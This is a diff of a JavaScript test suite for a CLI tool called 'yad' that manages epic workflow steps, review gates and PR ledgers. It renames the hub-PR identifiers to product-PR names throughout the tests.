@@ -2315,7 +2315,7 @@ test('preconditionsMet: current step runnable, downstream blocked, done step not
 });
 
 test('nextAction: author step → invoke the mapped skill', () => {
-  const a = nextAction({ state: chain({ currentStep: 'architecture', architecture: 'in_progress' }), hubPrs: [] }, { epic: 'EP-x' });
+  const a = nextAction({ state: chain({ currentStep: 'architecture', architecture: 'in_progress' }), productPrs: [] }, { epic: 'EP-x' });
   assert.equal(a.kind, 'author');
   assert.equal(a.skill, 'yad-architecture');
   assert.equal(a.artifact, 'architecture.md');
@@ -2323,10 +2323,10 @@ test('nextAction: author step → invoke the mapped skill', () => {
 
 test('nextAction: review step with no PR → open; with a PR → sync', () => {
   const state = chain({ currentStep: 'epic-review', epicReview: 'in_review', architecture: 'blocked' });
-  const open = nextAction({ state, hubPrs: [] }, { epic: 'EP-x' });
+  const open = nextAction({ state, productPrs: [] }, { epic: 'EP-x' });
   assert.equal(open.kind, 'review-open');
   assert.equal(open.command, 'yad gate open EP-x epic.md');
-  const sync = nextAction({ state, hubPrs: [{ artifact: 'epic.md', number: 7 }] }, { epic: 'EP-x' });
+  const sync = nextAction({ state, productPrs: [{ artifact: 'epic.md', number: 7 }] }, { epic: 'EP-x' });
   assert.equal(sync.kind, 'review-sync');
   assert.equal(sync.command, 'yad gate sync EP-x epic.md');
   assert.equal(sync.pr, 7);
@@ -2334,10 +2334,10 @@ test('nextAction: review step with no PR → open; with a PR → sync', () => {
 
 test('nextAction: ready-for-build → build; an open test-cases track is surfaced as parallel', () => {
   const base = { epicId: 'EP-x', currentStep: 'ready-for-build', steps: [S('stories-review', 'review+approve', 'done', 'stories/')] };
-  assert.equal(nextAction({ state: base, hubPrs: [] }).kind, 'build');
-  assert.equal(nextAction({ state: base, hubPrs: [] }).parallel, null);
+  assert.equal(nextAction({ state: base, productPrs: [] }).kind, 'build');
+  assert.equal(nextAction({ state: base, productPrs: [] }).parallel, null);
   const withTc = { ...base, steps: [...base.steps, S('test-cases', 'author', 'in_progress', 'test-cases.md')] };
-  const a = nextAction({ state: withTc, hubPrs: [] });
+  const a = nextAction({ state: withTc, productPrs: [] });
   assert.equal(a.kind, 'build');
   assert.equal(a.parallel.skill, 'yad-test-cases');
 });
@@ -2435,7 +2435,7 @@ test('buildNextActions: maps every story/repo, repos sorted', () => {
 test('nextAction: ready-for-build WITH build-state surfaces per-repo build sub-steps', () => {
   const state = { epicId: 'EP-x', currentStep: 'ready-for-build', steps: [S('stories-review', 'review+approve', 'done', 'stories/')] };
   const buildStates = [{ story: 'EP-x-S03', repos: { backend: repoBS('checks', ['spec', 'tasks', 'implement']) } }];
-  const a = nextAction({ state, hubPrs: [], buildStates });
+  const a = nextAction({ state, productPrs: [], buildStates });
   assert.equal(a.kind, 'build');
   assert.equal(a.builds.length, 1);
   assert.equal(a.builds[0].repos[0].skill, 'yad-checks');
@@ -2444,14 +2444,14 @@ test('nextAction: ready-for-build WITH build-state surfaces per-repo build sub-s
 
 test('nextAction: ready-for-build with NO build-state keeps the static start hint', () => {
   const state = { epicId: 'EP-x', currentStep: 'ready-for-build', steps: [S('stories-review', 'review+approve', 'done', 'stories/')] };
-  const a = nextAction({ state, hubPrs: [], buildStates: [] });
+  const a = nextAction({ state, productPrs: [], buildStates: [] });
   assert.equal(a.kind, 'build');
   assert.equal(a.builds, undefined);
   assert.match(a.why, /Shape approved/);
 });
 
 test('nextAction: no state → kind new (seed with yad-epic)', () => {
-  const a = nextAction({ state: null, hubPrs: [] }, { epic: 'EP-x' });
+  const a = nextAction({ state: null, productPrs: [] }, { epic: 'EP-x' });
   assert.equal(a.kind, 'new');
   assert.equal(a.skill, 'yad-epic');
 });
@@ -2466,24 +2466,24 @@ const dstate = (over) => ({
 });
 
 test('nextAction: discovery author step maps to yad-discovery', () => {
-  const a = nextAction({ state: dstate({ currentStep: 'discovery', discovery: 'in_progress', review: 'blocked' }), hubPrs: [] }, { epic: 'EP-discovery' });
+  const a = nextAction({ state: dstate({ currentStep: 'discovery', discovery: 'in_progress', review: 'blocked' }), productPrs: [] }, { epic: 'EP-discovery' });
   assert.equal(a.kind, 'author');
   assert.equal(a.skill, 'yad-discovery');
   assert.equal(a.artifact, 'discovery/');
 });
 
 test('nextAction: discovery in review → open the gate; with a PR → sync (no parallel track)', () => {
-  const open = nextAction({ state: dstate({ currentStep: 'discovery-review' }), hubPrs: [] }, { epic: 'EP-discovery' });
+  const open = nextAction({ state: dstate({ currentStep: 'discovery-review' }), productPrs: [] }, { epic: 'EP-discovery' });
   assert.equal(open.kind, 'review-open');
   assert.equal(open.command, 'yad gate open EP-discovery discovery/');
   assert.equal(open.parallel, undefined);
-  const sync = nextAction({ state: dstate({ currentStep: 'discovery-review' }), hubPrs: [{ artifact: 'discovery/', number: 3 }] }, { epic: 'EP-discovery' });
+  const sync = nextAction({ state: dstate({ currentStep: 'discovery-review' }), productPrs: [{ artifact: 'discovery/', number: 3 }] }, { epic: 'EP-discovery' });
   assert.equal(sync.kind, 'review-sync');
   assert.equal(sync.pr, 3);
 });
 
 test('nextAction: an approved discovery (discovery-done) points at yad-epic, not Build', () => {
-  const a = nextAction({ state: dstate({ currentStep: 'discovery-done', discovery: 'done', review: 'done' }), hubPrs: [] }, { epic: 'EP-discovery' });
+  const a = nextAction({ state: dstate({ currentStep: 'discovery-done', discovery: 'done', review: 'done' }), productPrs: [] }, { epic: 'EP-discovery' });
   assert.equal(a.kind, 'discovery-done');
   assert.match(a.why, /roadmap\.md/);
 });
@@ -4505,7 +4505,7 @@ test('gate sync: re-syncing a done step is a byte-identical no-op, threads and a
   const snapshot = () => ({
     approvals: fs.readFileSync(path.join(ep, '.sdlc/approvals.json'), 'utf8'),
     comments: fs.readFileSync(path.join(ep, '.sdlc/comments.json'), 'utf8'),
-    hubPrs: fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json'), 'utf8'),
+    productPrs: fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json'), 'utf8'),
     reviews: fs.readdirSync(path.join(ep, 'reviews')).sort(),
   });
   // Baseline BEFORE any re-sync, so a write by the first re-sync cannot be baked into it.
@@ -4532,7 +4532,7 @@ test('gate sync: advances multiple passing gates in CHAIN order, never in ledger
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'in_review', risk_tags: [] },
   );
   fs.writeFileSync(path.join(ep, '.sdlc/state.json'), JSON.stringify(state));
-  // Ledger order is alphabetical (what canonicalHubPrs writes) — the REVERSE of the chain here.
+  // Ledger order is alphabetical (what canonicalProductPrs writes) — the REVERSE of the chain here.
   fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify([
     { step: 'architecture-review', artifact: 'architecture.md', platform: 'github', number: 7, url: null, branch: 'review/EP-test/architecture', lastSyncedAt: null },
     { step: 'epic-review', artifact: 'epic.md', platform: 'github', number: 8, url: null, branch: 'review/EP-test/epic', lastSyncedAt: null },
@@ -4562,9 +4562,9 @@ test('gate sync: a two-step ledger is order-stable under a rotating re-sync (iss
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'in_review', risk_tags: [] },
   );
   fs.writeFileSync(path.join(ep, '.sdlc/state.json'), JSON.stringify(state));
-  const hubPrs = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json')));
-  hubPrs.push({ step: 'epic-review', artifact: 'epic.md', platform: 'github', number: 8, url: 'http://x/8', branch: 'review/EP-test/epic', lastSyncedAt: null });
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify(hubPrs));
+  const productPrs = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json')));
+  productPrs.push({ step: 'epic-review', artifact: 'epic.md', platform: 'github', number: 8, url: 'http://x/8', branch: 'review/EP-test/epic', lastSyncedAt: null });
+  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify(productPrs));
 
   const sync = (artifact, today) => gateSync(T, { epic: 'EP-test', artifact, today, reader: () => fullApproval });
   // Advance both gates, then let one full sweep settle the ledger.
@@ -4653,8 +4653,8 @@ test('gate sync: resolves an unrecorded review PR from the review branch (issue 
   assert.deepEqual(seen, [['github', 'review/EP-test/architecture']], 'looked the PR up by its review branch');
   const state = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/state.json')));
   assert.equal(state.steps.find((s) => s.id === 'architecture-review').status, 'done', 'the merged review advances');
-  const hubPrs = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json')));
-  assert.equal(hubPrs[0].number, 42, 'the resolved pointer is adopted on the writer path');
+  const productPrs = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json')));
+  assert.equal(productPrs[0].number, 42, 'the resolved pointer is adopted on the writer path');
   fs.rmSync(T, { recursive: true, force: true });
 });
 
@@ -5073,7 +5073,7 @@ test('missing ledger files still default silently (a fresh epic is a normal stat
   const ledger = loadLedger(path.join(T, 'epics/EP-x'));
   assert.equal(ledger.state, null);
   assert.deepEqual(ledger.approvals, []);
-  assert.deepEqual(ledger.hubPrs, []);
+  assert.deepEqual(ledger.productPrs, []);
   fs.rmSync(T, { recursive: true, force: true });
 });
 
@@ -5985,7 +5985,7 @@ test('runCommit: the missing-Task warning is stage-aware (hub vs code repo)', as
 // `yad gate ci` — merge-driven sync (Path B): read-only pre-merge; advance + status flip on the
 // default branch at merge. Derives the epic/artifact from the review branch name.
 // ---------------------------------------------------------------------------------------------
-const { parseReviewBranch, artifactFromBase, artifactPaths, upsertHubPr, artifactBase, advanceState, markInReview, discoveryHash, DISCOVERY_FILES, skipStep, unskipStep, deferStep, undeferStep, unblockStep, optionalStepsOf, optionalStepsFor, isSkippableStep, authorStepFor, repairState, canonicalApprovals, canonicalComments, canonicalHubPrs, isPassed, isAuthored } = await import('./epic-state.mjs');
+const { parseReviewBranch, artifactFromBase, artifactPaths, upsertProductPr, artifactBase, advanceState, markInReview, discoveryHash, DISCOVERY_FILES, skipStep, unskipStep, deferStep, undeferStep, unblockStep, optionalStepsOf, optionalStepsFor, isSkippableStep, authorStepFor, repairState, canonicalApprovals, canonicalComments, canonicalProductPrs, isPassed, isAuthored } = await import('./epic-state.mjs');
 const { gateCi } = await import('./gate.mjs');
 
 // issue #163. Sorting is only a fix if the order is TOTAL: `Array#sort` is stable, so records that tie
@@ -6011,17 +6011,17 @@ test('canonicalApprovals/canonicalComments impose a TOTAL order (no ties keep in
   // first. Two machines disagreeing on that is the same churn, reintroduced.
   const by = (name) => ({ ...a, approver: name });
   assert.deepEqual(canonicalApprovals([by('alice'), by('Zoe')]).map((x) => x.approver), ['Zoe', 'alice']);
-  // canonicalHubPrs has the narrowest key of the three, so it leans hardest on the tiebreak.
+  // canonicalProductPrs has the narrowest key of the three, so it leans hardest on the tiebreak.
   const pr = (artifact, number) => ({ step: `${artifact.split('.')[0]}-review`, artifact, platform: 'github', number });
   const prs = [pr('epic.md', 8), pr('architecture.md', 7), pr('ui-design.md', 9)];
-  assert.deepEqual(canonicalHubPrs(prs).map((x) => x.artifact), ['architecture.md', 'epic.md', 'ui-design.md']);
-  assert.equal(key(canonicalHubPrs(prs)), key(canonicalHubPrs([...prs].reverse())));
+  assert.deepEqual(canonicalProductPrs(prs).map((x) => x.artifact), ['architecture.md', 'epic.md', 'ui-design.md']);
+  assert.equal(key(canonicalProductPrs(prs)), key(canonicalProductPrs([...prs].reverse())));
   // Same artifact+step, different payload: the key ties, so only the tiebreak keeps this deterministic.
   const dup = [{ ...prs[0], number: 2 }, { ...prs[0], number: 1 }];
-  assert.equal(key(canonicalHubPrs(dup)), key(canonicalHubPrs([...dup].reverse())));
+  assert.equal(key(canonicalProductPrs(dup)), key(canonicalProductPrs([...dup].reverse())));
   // Empty / absent input is the ledger's normal starting state.
   assert.deepEqual(canonicalApprovals(), []);
-  assert.deepEqual(canonicalHubPrs(), []);
+  assert.deepEqual(canonicalProductPrs(), []);
 });
 
 test('parseReviewBranch accepts review/EP-*/<base> and rejects everything else', () => {
@@ -6488,7 +6488,7 @@ test('the chain readers walk past every passed state and stop on a blocked one',
     { ok: false, blockedBy: 'epic-review', reason: 'epic-review has not passed yet' });
 
   // …and `yad next` refuses to name a skill for it, printing what the record says instead.
-  const act = nextAction({ state: stuck, hubPrs: [] }, { epic: 'EP-x' });
+  const act = nextAction({ state: stuck, productPrs: [] }, { epic: 'EP-x' });
   assert.equal(act.kind, 'blocked');
   assert.equal(act.step, 'epic-review');
   assert.equal(act.skill, undefined, 'a blocked step has no skill to invoke — the blocker is not in this tool');
@@ -6497,7 +6497,7 @@ test('the chain readers walk past every passed state and stop on a blocked one',
   // A blocked step with no record at shape 7 reads as `todo` — so `yad next` names the step, not a
   // blocker nobody described. That surprise is exactly what `yad doctor`'s `step:no-record` reports.
   const vague = chain(S('epic', 'done'), S('epic-review', 'blocked'), S('architecture', 'todo'));
-  assert.equal(nextAction({ state: vague, hubPrs: [] }, { epic: 'EP-x' }).kind, 'review-open');
+  assert.equal(nextAction({ state: vague, productPrs: [] }, { epic: 'EP-x' }).kind, 'review-open');
 
   // An unknown state fails closed: the chain stops, and the step before it is what `yad next` names.
   const weird = chain(S('epic', 'quantum'), S('epic-review', 'todo'));
@@ -6925,7 +6925,7 @@ test('undeferStep after later work finished re-opens the pair beside it, and the
   advanceState(state, byId(state, 'stories-review'));
   assert.equal(state.currentStep, 'ready-for-build');
   assert.equal(byId(state, 'ui-design').status, 'in_progress');
-  const a = nextAction({ state, hubPrs: [] });
+  const a = nextAction({ state, productPrs: [] });
   assert.equal(a.kind, 'build');
   assert.deepEqual(a.reopened.map((l) => [l.step, l.kind]), [['ui-design', 'author']]);
   assert.equal(a.debt, undefined, 'a plain deferral is no debt');
@@ -6934,7 +6934,7 @@ test('undeferStep after later work finished re-opens the pair beside it, and the
   markInReview(state, byId(state, 'ui-design-review'));
   assert.equal(state.currentStep, 'ready-for-build');
   assert.equal(byId(state, 'ui-design').status, 'done');
-  assert.deepEqual(nextAction({ state, hubPrs: [] }).reopened.map((l) => [l.step, l.kind, l.command]),
+  assert.deepEqual(nextAction({ state, productPrs: [] }).reopened.map((l) => [l.step, l.kind, l.command]),
     [['ui-design-review', 'review-open', 'yad gate open EP-x ui-design.md']]);
 
   // (4) It passes: nothing after it re-opens, and there is no lane left.
@@ -6942,7 +6942,7 @@ test('undeferStep after later work finished re-opens the pair beside it, and the
   assert.equal(byId(state, 'ui-design-review').status, 'done');
   assert.equal(byId(state, 'stories').status, 'done', 'the finished stories are not re-opened');
   assert.equal(state.currentStep, 'ready-for-build');
-  assert.equal(nextAction({ state, hubPrs: [] }).reopened, undefined);
+  assert.equal(nextAction({ state, productPrs: [] }).reopened, undefined);
   assert.deepEqual(stateInvariants(state), []);
 });
 
@@ -7000,7 +7000,7 @@ test('debt: `yad defer --debt` marks the pair owed, the reminder lasts until the
   assert.equal(stepStatus(byId(state, 'ui-design')), 'deferred', 'a flag beside the state, not a state');
   assert.equal(isPassed(byId(state, 'ui-design')), true);
   assert.deepEqual(owedSteps(state).map((s) => s.id), ['ui-design'], 'one debt per pair');
-  assert.deepEqual(nextAction({ state, hubPrs: [] }).debt,
+  assert.deepEqual(nextAction({ state, productPrs: [] }).debt,
     [{ step: 'ui-design', status: 'deferred', record: { reason: 'launch date', by: '@al', date: '2026-09-14' } }]);
 
   // A plain deferral carries no flag; `--debt` on it later adds one and keeps the record.
@@ -7027,7 +7027,7 @@ test('debt: `yad defer --debt` marks the pair owed, the reminder lasts until the
   assert.equal(byId(owed, 'ui-design').debt, undefined);
   assert.equal(byId(owed, 'ui-design-review').debt, undefined);
   assert.deepEqual(owedSteps(owed), []);
-  assert.equal(nextAction({ state: owed, hubPrs: [] }).debt, undefined);
+  assert.equal(nextAction({ state: owed, productPrs: [] }).debt, undefined);
 });
 
 test('E41 review: a debt cannot be skipped, a late re-open can be deferred again, the late path needs FINISHED work, and a gate walks past inherited steps', () => {
@@ -7075,7 +7075,7 @@ test('E41 review: a debt cannot be skipped, a late re-open can be deferred again
   assert.equal(change.currentStep, 'stories');
   assert.equal(byId(change, 'stories').status, 'in_progress');
   assert.equal(stepStatus(byId(change, 'architecture')), 'satisfied', 'an inherited step is not written over');
-  assert.equal(nextAction({ state: change, hubPrs: [] }).step, 'stories');
+  assert.equal(nextAction({ state: change, productPrs: [] }).step, 'stories');
 });
 
 test('the shared walk steps over a deferred pair when a skip, un-skip or un-defer moves currentStep (E37)', () => {
@@ -7121,13 +7121,13 @@ test('unblockStep clears a real blocker: the status and the record together, nev
   assert.equal(byId(a, 'architecture').status, 'in_progress');
   assert.equal(byId(a, 'architecture').record, undefined, 'the record goes with the wait it explained');
   assert.equal(a.currentStep, 'architecture', 'currentStep is not this verb\'s to move');
-  assert.equal(nextAction({ state: a, hubPrs: [] }).kind, 'author');
+  assert.equal(nextAction({ state: a, productPrs: [] }).kind, 'author');
 
   // A blocked review gate goes to `todo`: opening the review is `yad gate open`'s job.
   const g = unblockStep(chain('architecture-review', 'done', 'blocked'), 'architecture-review');
   assert.equal(byId(g, 'architecture-review').status, 'todo');
   assert.equal(byId(g, 'architecture-review').record, undefined);
-  assert.equal(nextAction({ state: g, hubPrs: [] }).kind, 'review-open');
+  assert.equal(nextAction({ state: g, productPrs: [] }).kind, 'review-open');
 
   // A blocker the chain has not reached yet stays `todo`: nobody can work on it until the steps before it pass.
   const early = { epicId: 'EP-x', currentStep: 'epic', steps: [S('epic', 'in_progress'), S('epic-review', 'todo'), S('architecture', 'blocked', { record: { ...rec } })] };
@@ -7152,7 +7152,7 @@ test('a gate passing does not open a blocked step after it — the blocker stays
   assert.equal(state.currentStep, 'ui-design', 'the chain still moves to the step');
   assert.equal(byId(state, 'ui-design').status, 'blocked', 'a gate passing is not somebody saying the wait is over');
   assert.deepEqual(byId(state, 'ui-design').record, rec);
-  assert.equal(nextAction({ state, hubPrs: [] }).kind, 'blocked', '`yad next` shows the blocker, not "author the UI"');
+  assert.equal(nextAction({ state, productPrs: [] }).kind, 'blocked', '`yad next` shows the blocker, not "author the UI"');
   unblockStep(state, 'ui-design');
   assert.equal(byId(state, 'ui-design').status, 'in_progress', 'and once cleared, the step is the one being worked on');
   // The older spelling — `blocked` with NO record — is `todo`, so the gate still opens it as before.
@@ -8141,8 +8141,8 @@ test('closingRecord: `waived` rides only when it is given (E10)', async () => {
 test('gate sync: in solo mode a merged gate records waived: "solo" on the review step only, and gate status prints it (E10)', async () => {
   const { T, ep } = scaffoldEpic();
   try {
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const stateFile = path.join(ep, '.sdlc/state.json');
     const s0 = JSON.parse(fs.readFileSync(stateFile));
     s0.steps.find((x) => x.id === 'architecture').status = 'in_progress';
@@ -8272,8 +8272,8 @@ test('yad mode on a verified Product says its open reviews are on the platform, 
   const { runMode } = await import('./mode.mjs');
   const { T } = scaffoldEpic();
   try {
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), ledger: 'verified', bridge_enabled: true, bridge: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), ledger: 'verified', bridge_enabled: true, bridge: true }));
     let out = await grab(() => runMode(T, { to: 'solo', reason: 'on leave', today: '2026-09-15' }));
     assert.match(out, /open reviews live on the platform, not in state\.json — every open review PR\/MR follows the solo rule from its next CI run/);
     assert.doesNotMatch(out, /open review\(s\) follow/, 'the ledger list is not printed, since CI never marks a review open there');
@@ -8992,7 +8992,7 @@ test('a skipped lane is owed nothing: buildNextForRepo, the Build line, and feat
   const state = { epicId: 'EP-l', currentStep: 'ready-for-build', steps: [
     { id: 'epic', type: 'author', artifact: 'epic.md', status: 'done', risk_tags: [] },
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] }] };
-  const L = (repos) => ({ state, approvals: [], comments: [], hubPrs: [], buildStates: [{ story: 'EP-l-S01', repos }] });
+  const L = (repos) => ({ state, approvals: [], comments: [], productPrs: [], buildStates: [{ story: 'EP-l-S01', repos }] });
   assert.equal(nextAction(L({ api: done, web: { status: 'skipped', record: laneRecord } })).why, 'Build — every story/repo lane is shipped or skipped');
   assert.equal(nextAction(L({ api: done })).why, 'Build — every story/repo lane is shipped', 'the frozen wording when nothing is skipped');
   const stories = [{ id: 'EP-l-S01', repos: ['api', 'web'] }];
@@ -9121,7 +9121,7 @@ test('E39 review: a lane skipped before Build began still says Build can run, in
   const state = { epicId: 'EP-l', currentStep: 'ready-for-build', steps: [
     { id: 'epic', type: 'author', artifact: 'epic.md', status: 'done', risk_tags: [] },
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] }] };
-  const onlySkip = { state, approvals: [], comments: [], hubPrs: [], buildStates: [{ story: 'EP-l-S01', repos: { web: { status: 'skipped', record: laneRecord } } }] };
+  const onlySkip = { state, approvals: [], comments: [], productPrs: [], buildStates: [{ story: 'EP-l-S01', repos: { web: { status: 'skipped', record: laneRecord } } }] };
   assert.equal(nextAction(onlySkip).why, 'Shape approved — Build can run (every recorded lane is skipped; nothing has started)');
 
   const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-lane-first-step-'));
@@ -9154,7 +9154,7 @@ test('E39 review: skipped over real work is read as the work, an unknown status 
   const state = { epicId: 'EP-l', currentStep: 'ready-for-build', steps: [
     { id: 'epic', type: 'author', artifact: 'epic.md', status: 'done', risk_tags: [] },
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] }] };
-  const L = { state, approvals: [], comments: [], hubPrs: [], buildStates: [{ story: 'EP-l-S01', repos: { api: done, web: busy } }] };
+  const L = { state, approvals: [], comments: [], productPrs: [], buildStates: [{ story: 'EP-l-S01', repos: { api: done, web: busy } }] };
   assert.equal(featureStatus(L, { stories: [{ id: 'EP-l-S01', repos: ['api', 'web'] }] }), 'in-build', 'not shipped while work is under way');
 
   assert.equal(laneStarted({ steps: [{ id: 'spec', status: 'running' }] }), true, 'an unknown word is started (fail closed)');
@@ -9328,12 +9328,12 @@ test('CLI: `yad unblock` clears a recorded blocker, and `yad next` names it as t
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
 
-test('upsertHubPr replaces by artifact, never duplicates', () => {
-  const a = upsertHubPr([], { artifact: 'epic.md', number: 1 });
-  const b = upsertHubPr(a, { artifact: 'epic.md', number: 2 });
+test('upsertProductPr replaces by artifact, never duplicates', () => {
+  const a = upsertProductPr([], { artifact: 'epic.md', number: 1 });
+  const b = upsertProductPr(a, { artifact: 'epic.md', number: 2 });
   assert.equal(b.length, 1);
   assert.equal(b[0].number, 2);
-  const c2 = upsertHubPr(b, { artifact: 'architecture.md', number: 3 });
+  const c2 = upsertProductPr(b, { artifact: 'architecture.md', number: 3 });
   assert.equal(c2.length, 2);
 });
 
@@ -9400,8 +9400,8 @@ const show = (cwd, ref) => git(cwd, 'show', ref).toString();
 test('gate ci: a merge in solo mode records waived: "solo" too — the path a verified Product takes (E10)', async () => {
   const { T, ci } = scaffoldCiHub();
   try {
-    const hubFile = path.join(ci, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(ci, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     await gateCi(ci, { branch: 'review/EP-test/architecture', pr: 7, merged: true, push: false, today: '2026-06-09',
       reader: () => ({ ...fullApproval, reviews: [], mergedAt: '2026-06-08T00:00:00Z', mergedBy: 'al' }) });
     const state = JSON.parse(fs.readFileSync(path.join(ci, 'epics/EP-test/.sdlc/state.json'), 'utf8'));
@@ -9571,11 +9571,11 @@ test('E64 review: doctor does not throw on an approvals.json holding a null entr
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] },
   ] }));
   fs.writeFileSync(path.join(ep, 'approvals.json'), JSON.stringify([null]));
-  const hubFile = path.join(T, '.sdlc/hub.json');
+  const productFile = path.join(T, '.sdlc/hub.json');
   try {
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', roster: [] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', roster: [] }));
     let base = null; try { await doctorOn(T); } catch (e) { base = e; }
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }] }));
     let withRoster = null; try { await doctorOn(T); } catch (e) { withRoster = e; }
     assert.deepEqual([base?.message ?? null, withRoster?.message ?? null], [null, null]);
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
@@ -11399,7 +11399,7 @@ test('doctor: roster data an older release wrote is named as unused — empty ke
 test('doctor E64: the roster warning says when it can go — counted with the same stamp the gate writes', async () => {
   const { T } = scaffold();
   await reconcile(T, { fix: true });
-  const hubFile = path.join(T, '.sdlc/hub.json');
+  const productFile = path.join(T, '.sdlc/hub.json');
   const ep = path.join(T, 'epics/EP-a/.sdlc');
   fs.mkdirSync(ep, { recursive: true });
   fs.writeFileSync(path.join(ep, 'state.json'), JSON.stringify({ epicId: 'EP-a', currentStep: 'architecture', steps: [
@@ -11409,16 +11409,16 @@ test('doctor E64: the roster warning says when it can go — counted with the sa
   fs.writeFileSync(path.join(ep, 'approvals.json'), JSON.stringify(older));
   const hint = async () => (await doctorOn(T)).checks.find((x) => x.id === 'people:roster-unused')?.hint;
   try {
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }, { login: 'k1', name: 'kim' }, { login: 'k2', name: 'kim' }] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }, { login: 'k1', name: 'kim' }, { login: 'k2', name: 'kim' }] }));
     assert.match(await hint(), /keep it for now: 1 older approval\/comment record\(s\) in EP-a still name people by roster name\. The next gate write records their logins — `yad gate sync <epic>`/);
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', ledger: 'verified', roster: [{ login: 'al', name: 'alice' }] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', ledger: 'verified', roster: [{ login: 'al', name: 'alice' }] }));
     assert.match(await hint(), /CI's run on the next merged review/, 'a verified Product is stamped by CI, not by a person');
     // After the gate write: nothing waits. A record under a shared name is the one thing left.
     const { stampLegacyLogins } = await import('./gate.mjs');
     const stamped = stampLegacyLogins({ approvals: older }, { aliases: new Map([['alice', 'al']]) }).approvals;
     fs.writeFileSync(path.join(ep, 'approvals.json'), JSON.stringify(stamped));
     assert.match(await hint(), /no older record needs it any more — delete the `roster` key/);
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }, { login: 'k1', name: 'kim' }, { login: 'k2', name: 'kim' }] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }, { login: 'k1', name: 'kim' }, { login: 'k2', name: 'kim' }] }));
     fs.writeFileSync(path.join(ep, 'approvals.json'), JSON.stringify([...stamped, { ...older[0], approver: 'kim' }]));
     assert.match(await hint(), /every older record it can place names its login now; 1 it cannot place/);
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
@@ -12216,7 +12216,7 @@ test('syncStatuses reconciles the discovery set: draft → approved once discove
       ];
       const steps = [];
       const approvals = [];
-      const hubPrs = [];
+      const productPrs = [];
       cases.forEach(([review, artifact, file, at], i) => {
         fs.writeFileSync(path.join(ep, file), fmFile('EP-legacy', at));
         const hash = artifactHash(ep, artifact, fileSha);
@@ -12227,12 +12227,12 @@ test('syncStatuses reconciles the discovery set: draft → approved once discove
           approvals.push({ artifact, step: review, approver, role, status: 'approved', date: '2026-06-09', source: 'bridge',
             artifactHash: hash, approvedAt: '2026-06-09T00:00:00Z', pr: 10 + i, engagement: 'none' });
         }
-        hubPrs.push({ step: review, artifact, platform: 'github', number: 10 + i, url: `http://x/${10 + i}`, branch: `review/EP-legacy/${artifact.replace('.md', '')}`, lastSyncedAt: '2026-06-09' });
+        productPrs.push({ step: review, artifact, platform: 'github', number: 10 + i, url: `http://x/${10 + i}`, branch: `review/EP-legacy/${artifact.replace('.md', '')}`, lastSyncedAt: '2026-06-09' });
       });
       for (const [, , file, , to] of cases) if (to) flip(path.join(ep, file), to);
       fs.writeFileSync(path.join(ep, '.sdlc/state.json'), JSON.stringify({ epicId: 'EP-legacy', currentStep: 'ready-for-build', steps }));
       fs.writeFileSync(path.join(ep, '.sdlc/approvals.json'), JSON.stringify(approvals));
-      fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify(hubPrs));
+      fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify(productPrs));
 
       const status = await grab(() => gateStatus(T, { epic: 'EP-legacy' }));
       for (const [review] of cases) {
@@ -16796,7 +16796,7 @@ test('nextAction names the bound skill for every kind of action it resolves', ()
       epicId: 'EP-x', currentStep,
       steps: ids.map(([id, type, artifact, status]) => ({ id, type, artifact, status })),
     },
-    hubPrs: [],
+    productPrs: [],
   });
 
